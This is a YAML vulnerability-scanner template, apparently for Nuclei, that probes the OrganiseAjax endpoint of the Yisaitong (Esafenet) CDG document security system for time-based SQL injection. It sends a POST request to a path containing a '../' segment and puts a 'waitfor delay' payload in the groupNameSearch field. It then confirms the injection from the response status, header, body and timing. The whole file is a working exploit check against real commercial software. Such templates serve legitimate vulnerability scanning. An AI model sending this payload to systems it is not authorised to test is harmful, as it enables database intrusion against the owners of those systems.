id: poc-yaml-yisaitong-esafenet-organiseajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 OrganiseAjax SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(2, 5)}}'
  t2: '{{to_number(t1) + to_number(t1)}}'
  t3: '{{to_number(t2) + 2}}'

http:
  - method: POST
    path:
      - "{{BaseURL}}/CDGServer3/js/../OrganiseAjax"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "command=search&groupNameSearch=-1'waitfor delay '0:0:{{t1}}'--"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "CDGServer3"
      - type: word
        part: body
        words:
          - "waitfor delay"
      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
